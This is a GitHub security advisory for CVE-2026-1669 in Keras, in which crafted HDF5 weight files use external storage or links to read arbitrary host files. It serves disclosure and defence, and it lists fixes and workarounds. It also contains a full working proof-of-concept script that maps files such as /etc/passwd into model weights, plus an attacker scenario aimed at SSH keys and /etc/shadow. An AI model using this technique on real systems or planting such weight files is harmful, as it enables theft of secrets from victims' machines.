# [H] Keras has a Local File Disclosure via HDF5 External Storage During Keras Weight Loading

## Summary
Severity: High
Advisory: GHSA-3m4q-jmj6-r34q
CVE: CVE-2026-1669
CWE: CWE-200, CWE-73
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-02-18
Source: https://github.com/advisories/GHSA-3m4q-jmj6-r34q
Type: github-advisory

## Affected
- PyPI: `keras` — affected >=3.13.0 <3.13.2
- PyPI: `keras` — affected >=3.0.0 <3.12.1

## Details
## Summary

TensorFlow / Keras continues to honor HDF5 “external storage” and `ExternalLink` features when loading weights. A malicious `.weights.h5` (or a `.keras` archive embedding such weights) can direct `load_weights()` to read from an arbitrary readable filesystem path. The bytes pulled from that path populate model tensors and become observable through inference or subsequent re-save operations. Keras “safe mode” only guards object deserialization and does not cover weight I/O, so this behaviour persists even with safe mode enabled. The issue is confirmed on the latest publicly released stack (`tensorflow 2.20.0`, `keras 3.11.3`, `h5py 3.15.1`, `numpy 2.3.4`).

## Impact

- **Class**: CWE-200 (Exposure of Sensitive Information), CWE-73 (External Control of File Name or Path)
- **What leaks**: Contents of any readable file on the host (e.g., `/etc/hosts`, `/etc/passwd`, `/etc/hostname`).
- **Visibility**: Secrets appear in model outputs (e.g., Dense layer bias) or get embedded into newly saved artifacts.
- **Prerequisites**: Victim executes `model.load_weights()` or `tf.keras.models.load_model()` on an attacker-supplied HDF5 weights file or `.keras` archive.
- **Scope**: Applies to modern Keras (3.x) and TensorFlow 2.x lines; legacy HDF5 paths remain susceptible.

## Attacker Scenario

1. **Initial foothold**: The attacker convinces a user (or CI automation) to consume a weight artifact—perhaps by publishing a pre-trained model, contributing to an open-source repository, or attaching weights to a bug report.
2. **Crafted payload**: The artifact bundles innocuous model metadata but rewrites one or more datasets to use HDF5 external storage or external links pointing at sensitive files on the victim host (e.g., `/home/<user>/.ssh/id_rsa`, `/etc/shadow` if readable, configuration files containing API keys, etc.).
3. **Execution**: The victim calls `model.load_weights()` (or `tf.keras.models.load_model()` for `.keras` archives). HDF5 follows the external references, opens the targeted host file, and streams its bytes into the model tensors.
4. **Exfiltration vectors**:
   - Running inference on controlled inputs (e.g., zero vectors) yields outputs equal to the injected weights; the attacker or downstream consumer can read the leaked data.
   - Re-saving the model (weights or `.keras` archive) persists the secret into a new artifact, which may later be shared publicly or uploaded to a model registry.
   - If the victim pushes the re-saved artifact to source control or a package repository, the attacker retrieves the captured data without needing continued access to the victim environment.

### Additional Preconditions

- The target file must exist and be readable by the process running TensorFlow/Keras.
- Safe mode (`load_model(..., safe_mode=True)`) does not mitigate the issue because the attack path is weight loading rather than object/lambda deserialization.
- Environments with strict filesystem permissioning or sandboxing (e.g., container runtime blocking access to `/etc/hostname`) can reduce impact, but common defaults expose a broad set of host files.

## Environment Used for Verification (2025‑10‑19)

- OS: Debian-based container running Python 3.11.
- Packages (installed via `python -m pip install -U ...`):
  - `tensorflow==2.20.0`
  - `keras==3.11.3`
  - `h5py==3.15.1`
  - `numpy==2.3.4`
- Tooling: `strace` (for syscall tracing), `pip` upgraded to latest before installs.
- Debug flags: `PYTHONFAULTHANDLER=1`, `TF_CPP_MIN_LOG_LEVEL=0` during instrumentation to capture verbose logs if needed.

## Reproduction Instructions (Weights-Only PoC)

1. Ensure the environment above (or equivalent) is prepared.
2. Save the following script as `weights_external_demo.py`:

```python
from __future__ import annotations
import os
from pathlib import Path
import numpy as np
import tensorflow as tf
import h5py

def choose_host_file() -> Path:
    candidates = [
        os.environ.get("KFLI_PATH"),
        "/etc/machine-id",
        "/etc/hostname",
        "/proc/sys/kernel/hostname",
        "/etc/passwd",
    ]
    for candidate in candidates:
        if not candidate:
            continue
        path = Path(candidate)
        if path.exists() and path.is_file():
            return path
    raise FileNotFoundError("set KFLI_PATH to a readable file")

def build_model(units: int) -> tf.keras.Model:
    model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=(1,), name="input"),
        tf.keras.layers.Dense(units, activation=None, use_bias=True, name="dense"),
    ])
    model(tf.zeros((1, 1)))  # build weights
    return model

def find_bias_dataset(h5file: h5py.File) -> str:
    matches: list[str] = []
    def visit(name: str, obj) -> None:
        if isinstance(obj, h5py.Dataset) and name.endswith("bias:0"):
            matches.append(name)
    h5file.visititems(visit)
    if not matches:
        raise RuntimeError("bias dataset not found")
    return matches[0]

def rewrite_bias_external(path: Path, host_file: Path) -> tuple[int, int]:
    with h5py.File(path, "r+") as h5file:
        bias_path = find_bias_dataset(h5file)
        parent = h5file[str(Path(bias_path).parent)]
        dset_name = Path(bias_path).name
        del parent[dset_name]
        max_bytes = 128
        size = host_file.stat().st_size
        nbytes = min(size, max_bytes)
        nbytes = (nbytes // 4) * 4 or 32  # multiple of 4 for float32 packing
        units = max(1, nbytes // 4)
        parent.create_dataset(
            dset_name,
            shape=(units,),
            dtype="float32",
            external=[(host_file.as_posix(), 0, nbytes)],
        )
        return units, nbytes

def floats_to_ascii(arr: np.ndarray) -> tuple[str, str]:
    raw = np.ascontiguousarray(arr).view(np.uint8)
    ascii_preview = bytes(b if 32 <= b < 127 else 46 for b in raw).decode("ascii", "ignore")
    hex_preview = raw[:64].tobytes().hex()
    return ascii_preview, hex_preview

def main() -> None:
    host_file = choose_host_file()
    model = build_model(units=32)

    weights_path = Path("weights_demo.h5")
    model.save_weights(weights_path.as_posix())

    units, nbytes = rewrite_bias_external(weights_path, host_file)
    print("secret_text_source", host_file)
    print("units", units, "bytes_mapped", nbytes)

    model.load_weights(weights_path.as_posix())
    output = model.predict(tf.zeros((1, 1)), verbose=0)[0]
    ascii_preview, hex_preview = floats_to_ascii(output)
    print("recovered_ascii", ascii_preview)
    print("recovered_hex64", hex_preview)

    saved = Path("weights_demo_resaved.h5")
    model.save_weights(saved.as_posix())
    print("resaved_weights", saved.as_posix())

if __name__ == "__main__":
    main()
```

3. Execute `python weights_external_demo.py`.
4. Observe:
   - `secret_text_source` prints the chosen host file path.
   - `recovered_ascii`/`recovered_hex64` display the file contents recovered via model inference.
   - A re-saved weights file contains the leaked bytes inside the artifact.

## Expanded Validation (Multiple Attack Scenarios)

The following test harness generalises the attack for multiple HDF5 constructs:

- Build a minimal feed-forward model and baseline weights.
- Create three malicious variants:
  1. **External storage dataset**: dataset references `/etc/hosts`.
  2. **External link**: `ExternalLink` pointing at `/etc/passwd`.
  3. **Indirect link**: external storage referencing a helper HDF5 that, in turn, refers to `/etc/hostname`.
- Run each scenario under `strace -f -e trace=open,openat,read` while calling `model.load_weights(...)`.
- Post-process traces and weight tensors to show the exact bytes loaded.

Relevant syscall excerpts captured during the run:

```
openat(AT_FDCWD, "/etc/hosts", O_RDONLY|O_CLOEXEC) = 7
read(7, "127.0.0.1 localhost\n", 64) = 21
...
openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 9
read(9, "root:x:0:0:root:/root:/bin/bash\n", 64) = 32
...
openat(AT_FDCWD, "/etc/hostname", O_RDONLY|O_CLOEXEC) = 8
read(8, "example-host\n", 64) = 13
```

The corresponding model weight bytes (converted to ASCII) mirrored these file contents, confirming successful exfiltration in every case.

## Recommended Product Fix

1. **Default-deny external datasets/links**:
   - Inspect creation property lists (`get_external_count`) before materialising tensors.
   - Resolve `SoftLink` / `ExternalLink` targets and block if they leave the HDF5 file.
2. **Provide an escape hatch**:
   - Offer an explicit `allow_external_data=True` flag or environment variable for advanced users who truly rely on HDF5 external storage.
3. **Documentation**:
   - Update security guidance and API docs to clarify that weight loading bypasses safe mode and that external HDF5 references are rejected by default.
4. **Regression coverage**:
   - Add automated tests mirroring the scenarios above to ensure future refactors do not reintroduce the issue.

## Workarounds

- Avoid loading untrusted HDF5 weight files.
- Pre-scan weight files using `h5py` to detect external datasets or links before invoking Keras loaders.
- Prefer alternate formats (e.g., NumPy `.npz`) that lack external reference capabilities when exchanging weights.
- If isolation is unavoidable, run the load inside a sandboxed environment with limited filesystem access.

## Timeline (UTC)

- **2025‑10‑18**: Initial proof against TensorFlow 2.12.0 confirmed local file disclosure.
- **2025‑10‑19**: Re-validated on TensorFlow 2.20.0 / Keras 3.11.3 with syscall tracing; produced weight artifacts and JSON summaries for each malicious scenario; implemented `safe_keras_hdf5.py` prototype guard.

## References
- https://github.com/keras-team/keras/security/advisories/GHSA-3m4q-jmj6-r34q
- https://nvd.nist.gov/vuln/detail/CVE-2026-1669
- https://github.com/keras-team/keras/pull/22057
- https://github.com/keras-team/keras/commit/8a37f9dadd8e23fa4ee3f537eeb6413e75d12553
- https://github.com/keras-team/keras
- https://github.com/keras-team/keras/releases/tag/v3.12.1
- https://github.com/keras-team/keras/releases/tag/v3.13.2
